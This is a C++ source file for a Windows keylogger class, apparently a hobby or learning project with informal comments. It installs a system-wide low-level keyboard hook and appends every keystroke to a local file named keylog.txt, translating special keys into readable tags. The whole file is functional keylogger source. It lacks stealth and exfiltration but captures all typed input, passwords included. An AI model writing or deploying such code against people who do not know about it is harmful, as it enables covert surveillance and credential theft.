#include "keylogger.h"

// Static instance initialization
KeyLogger* KeyLogger::instance = nullptr;  //keylogger not active 

// ---------------- CONSTRUCTOR ----------------
KeyLogger::KeyLogger() {
    keyboardHook = NULL;  //keyhook not active 
    instance = this; //keylogger created, it thenpoints to itself 
}

// ---------------- LOG FUNCTION ---------------- 
void KeyLogger::logKeystroke(int key) {   //stores chars and saves in file by append mode 
    ofstream logfile("keylog.txt", ios::app);

    if (!logfile.is_open()) return;

    if (key == VK_BACK)
        logfile << "[BACKSPACE]";
    else if (key == VK_RETURN)
        logfile << "\n";
    else if (key == VK_SPACE)
        logfile << " ";
    else if (key == VK_TAB)
        logfile << "[TAB]";
    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        logfile << "[SHIFT]";
    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        logfile << "[CTRL]";
    else if (key == VK_ESCAPE)
        logfile << "[ESC]";
    else if (key == VK_OEM_PERIOD)
        logfile << ".";
    else if (key >= 0x41 && key <= 0x5A) {
        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        logfile << (shiftPressed ? (char)key : (char)(key + 32));
    }
    else if (key >= 0x30 && key <= 0x39) {
        logfile << (char)key;
    }
    else {
        logfile << "[" << key << "]";
    }
 
    logfile.close();  //after writing closes file 
}

// ---------------- KEYBOARD HOOK ----------------
LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {  //parameters for data thats written 
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        instance->logKeystroke(pKeyBoard->vkCode);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ---------------- START ----------------
bool KeyLogger::start() {
    cout << "Keylogger started...\n";

    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,  //notices key event and processes it 
        KeyboardProc,
        GetModuleHandle(NULL), //applieds hook to running prog
        0
    );

    if (keyboardHook == NULL) {
        cout << "Hook failed!\n";
        return false;
    }

    cout << "Hook installed successfully.\n";
    return true;
}

// ---------------- RUN ----------------
void KeyLogger::run() {
    MSG msg; //container
    while (GetMessage(&msg, NULL, 0, 0)) {  //infinite loop that waits for key event 
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// ---------------- STOP ----------------
void KeyLogger::stop() {
    UnhookWindowsHookEx(keyboardHook);  
    cout << "Keylogger stopped.\n";
}